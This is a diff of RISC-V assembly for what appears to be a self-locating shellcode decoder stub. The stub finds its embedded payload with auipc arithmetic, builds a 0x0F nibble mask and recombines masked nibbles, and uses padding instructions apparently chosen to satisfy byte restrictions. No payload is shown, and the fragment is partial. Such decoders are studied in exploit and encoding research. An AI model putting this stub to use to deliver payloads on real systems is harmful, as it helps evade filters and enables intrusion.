@@ -1,33 +1,45 @@
+
 	.globl	_start
 	
 	.text
 _start:
 # get payload address into s0
 	auipc	s0, 0x7e7e1
-	lui	a7, 0x8181e
-	c.swsp	t0, 0x28
-	add	s0, s0, a7
-        addi    s0, s0, 0x7ff
-        addi    s0, s0, 0x7ff
-        addi    s0, s0, 88
+#	c.and	a5, a0
+	lui	a6, 0x8181e
+	add	s2, s0, a6
+	sub	s0, s2, x0
+        addi    s0, s0, 0x7f7
+        addi    s0, s0, 0x7f7
+        addi    s0, s0, 126
 
-# load 8 bytes of 0x0F into a2
-	li	t1, 0x0F0F
-	c.xor	a2, a2
-	c.add	a2, t1
-	c.slli	a2, 16
-	c.add	a2, t1
-	c.slli	a2, 16
-	c.add	a2, t1
-	c.slli	a2, 16
-	c.add 	a2, t1
+# Temp to deal with stupidity
+	c.li	a6, 0x3
+	c.li    a6, 0x3
+	c.li    a6, 0x3
+	c.li    a6, 0x3
+
+# load 8 bytes of 0x0F into a7
+#	addi	a4, s4, -1158
+	c.and 	a5, a0
+	xor	a7, s6, s6
+	c.li	a6, 0x0F
+	c.add	a7, a6
+	c.slli	a7, 8
+	c.add	a7, a6
+	c.mv 	a6, a7
+	c.slli	a7, 16
+	c.add	a7, a6
+	c.mv	a6, a7
+	c.slli	a7, 32
+	c.add 	a7, a6
 
 # get count into s1
 	c.ld	s1, 0(s0)
 	c.ld	a5, 8(s0)
 	c.addi	s0, 16
-	c.and	s1, a2
-	c.and	a5, a2
+	and	s1, s1, a7
+	and	a5, a5, a7
 	c.slli	a5, 4
 	c.add	s1, a5
 
@@ -37,8 +49,8 @@ _start:
 	c.ld	a1, 8(s0)
 	c.addi	s0, 16
 
-	c.and	a0, a2
-	c.and	a1, a2
+	and	a0, a0, a7
+	and	a1, a1, a7
 	c.slli	a1, 4
 	c.add	a0, a1
 
